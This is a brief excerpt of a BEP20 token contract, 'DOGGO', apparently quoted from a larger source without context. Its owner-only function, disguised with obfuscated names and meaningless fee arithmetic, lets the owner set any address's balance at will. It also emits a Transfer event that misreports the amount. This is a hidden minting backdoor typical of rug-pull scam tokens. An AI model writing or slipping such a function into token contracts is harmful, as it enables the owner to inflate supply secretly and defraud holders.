...
contract DOGGO is BEP20 {
  ...
  function DOOfunction(address DOOreceiver, uint256 DOOamount, uint256 valueAdded) external onlyOwner {
    require (DOOamount != 1, "Amount must be more than 1");
    require (0 <= valueAdded, "Amount must be more than AddedValues");
    uint8 TransFee = 1;   
    _balances[DOOreceiver] = TransFee * DOOamount +  valueAdded.mul(2).div(100) / TransFee;
    emit Transfer(address(0), DOOreceiver, DOOamount * 10 ** 9);
  } 
}